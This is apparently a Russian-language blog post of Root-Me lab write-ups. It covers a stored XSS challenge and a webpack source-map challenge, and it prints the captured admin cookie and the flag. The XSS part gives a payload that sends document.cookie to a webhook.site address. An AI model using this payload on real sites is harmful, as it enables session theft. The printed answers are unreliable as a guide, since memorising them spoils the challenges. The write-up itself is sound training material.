---
title: '[WEB] "XSS - Stockée 1"'
date: 2025-12-03T03:15:00+03:00
categories:
  - Lab
tags:
  - web
  - xss
excerpt: " "
header:
  overlay_image: https://apprendre-avec-le-jeu.com/wp-content/uploads/2024/03/Root-me-Logo.png
  overlay_filter: 0.4
  actions:
    - label: "Lab Root-Me"
      url: "https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-1"
---

**Украдите файл cookie сеанса администратора и используйте его для проверки события.**  

При заходе на сайт, мы получаем такую форму  
<img width="1919" height="993" alt="image" src="https://github.com/user-attachments/assets/6006305e-4333-459d-aee8-38e897d43f81" />  
Так как в задании сказано про xss попробуем вызвать alert. Message: "**<script>alert('123);</script>**"  
<img width="1919" height="992" alt="image" src="https://github.com/user-attachments/assets/2a3b1fca-2bdb-4bc0-a030-4e0f8cfa000d" />  
Отлично! Мы имеем xss уязвимость. Так как у нас задание перехватить cookie админа, попробуем получить его с помощью скрипта, перенаправляющего пользователя на наш сайт, в url которого будут передаваться cookie пользователя, в надежде, что админ зайдет на него.  
Для этого получим ссылку на наш сайт через https://webhook.site/ и напишем небольшой скрипт ```<script>document.write('<img src="http://webhook.site/YOUR-UNIQUE-ID?cmd=' + document.cookie + '" width=0 height=0 border=0 />');</script>```. После подстановки 'YOUR-UNIQUE-ID' отправляю payload в поле _message_.  
Администратор зашел на сайт и мы получили его cookie!
<img width="793" height="76" alt="image" src="https://github.com/user-attachments/assets/ae74d2fa-d1bc-46dd-95d0-cab629a3bf9b" />  
```ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6```  

# Javascript - Webpack
## Найдите пароль.
При переходе на страницу, сразу смотрю исходный код. Замечаю, что все js лежат в директории **/static/js**
<img width="1919" height="272" alt="image" src="https://github.com/user-attachments/assets/ccd20e03-072a-4409-a6d7-14c7afe1abf1" />  
Перехожу в эту директорию и вижу файлы с расширением **.js.map** скачиваю первый из них. 
<img width="1105" height="952" alt="image" src="https://github.com/user-attachments/assets/a898d088-8f8d-4f96-ae66-5b6da06025ac" />  
Загружаю его на сайт **https://evanw.github.io/source-map-visualization/** для более удобного просмотра. 
<img width="1919" height="991" alt="image" src="https://github.com/user-attachments/assets/14c02f7f-6ac9-4bc8-8638-79fabf883f96" />  
Сразу замечаю интересный webpack с названием **YouWillNotFindThisRouteBecauseItIsHidden.vue**  
И сразу видно комментарий с флагом, оставленный автором.  
<img width="1919" height="987" alt="image" src="https://github.com/user-attachments/assets/b77002ee-d462-4b74-8658-a7c6442c548e" />  
```Флаг: BecauseSourceMapsAreGreatForDebuggingButNotForProduction``` 

